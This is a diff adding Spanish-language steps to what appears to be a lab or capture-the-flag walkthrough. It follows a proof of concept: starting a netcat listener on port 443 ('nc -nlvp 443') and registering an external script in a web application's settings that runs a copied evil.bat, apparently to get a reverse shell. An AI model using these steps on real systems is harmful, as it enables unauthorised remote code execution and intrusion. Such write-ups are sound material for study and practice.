@@ -207,6 +207,17 @@ copy x:\evil.bat evil.bat
 copy x:\nc.exe nc.exe
 ```
 
+A continuación el *POC* nos indica que debemos de ponernos en escucha en la maquina atacante en el puerto indicado en el `evil.bat`
+```shell
+nc -nlvp 443
+```
 
+Y en la web deberemos de añadir un script en la ruta `Sttings > External Scripts > Scripts` añadir uno nuevo que ejecute
+```shell
+C:\temp\evil.bat
+```
+
+Lo añadimos, hacemos un *Reload* en la pestaña de *Control*
+Navegamos a Queries
 
 
